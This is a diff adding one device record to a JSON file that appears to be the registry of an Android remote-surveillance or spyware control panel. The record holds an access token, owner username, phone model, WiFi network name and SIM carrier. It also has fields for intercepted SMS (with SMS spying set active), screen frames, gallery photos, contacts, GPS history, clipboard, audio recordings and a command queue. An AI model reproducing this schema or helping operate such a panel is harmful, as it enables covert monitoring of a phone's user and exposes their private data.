@@ -30,5 +30,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_a519b0ab",
+    "deviceName": "HP-LOCK-F00B",
+    "ownerUsername": "Riz99",
+    "token": "16f4a0bcfda1d2b0cee9ad894d0286d0",
+    "lastSeen": 1775751842368,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-09T16:24:02.368Z",
+    "deviceInfo": {
+      "model": "Xiaomi 24040RN64Y",
+      "androidVersion": "Android 15",
+      "battery": 19,
+      "network": "WiFi: Al&Shela",
+      "sim1": "TELKOMSEL",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
